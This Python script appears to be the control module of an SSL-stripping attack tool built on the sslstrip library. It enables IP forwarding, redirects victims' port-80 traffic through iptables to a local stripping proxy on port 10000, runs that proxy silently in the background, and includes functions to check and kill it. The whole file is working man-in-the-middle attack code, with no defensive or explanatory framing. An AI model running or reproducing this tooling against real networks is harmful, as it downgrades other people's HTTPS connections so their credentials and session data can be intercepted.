from twisted.web import http

from sslstrip.sslstrip.StrippingProxy import StrippingProxy
from sslstrip.sslstrip.URLMonitor import URLMonitor
from sslstrip.sslstrip.CookieCleaner import CookieCleaner

import sys
import subprocess as sp
from os import devnull

DEVNULL = open(devnull, 'w')

URLMonitor.getInstance().setFaviconSpoofing(False)
CookieCleaner.getInstance().setEnabled(False)

strippingFactory          = http.HTTPFactory(timeout=10)
strippingFactory.protocol = StrippingProxy

def sslStripping():

    print("\nSSL stripping listening on port 10000\n")

    with open("/proc/sys/net/ipv4/ip_forward", "w") as ip4:
        ip4.write("1")
    
    sp.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000".split())
    sp.Popen("python sslStart.py".split(), stdout=DEVNULL, stderr=DEVNULL)

    return

def sslStatus():

    getStatus = sp.Popen("netstat -ltnp".split(),stdout=sp.PIPE,stderr=sp.PIPE)
    (getStatusOut,_) = getStatus.communicate()

    status = [process for process in getStatusOut.split("\n") if ":10000" in process]

    return status

def displayStatus():
    
    if sslStatus():
        print("\nactive")

    else:
        print("\ninactive")

    return

def stopStripping():

    status = sslStatus()

    while status: 
        
        pid = status[0].split()[-1][0:4]
        sp.Popen(["kill", "-9", str(pid)])
        print("\nprocess killed")
        status = sslStatus()

    else:
        print("\nssl stripping not active")

    return
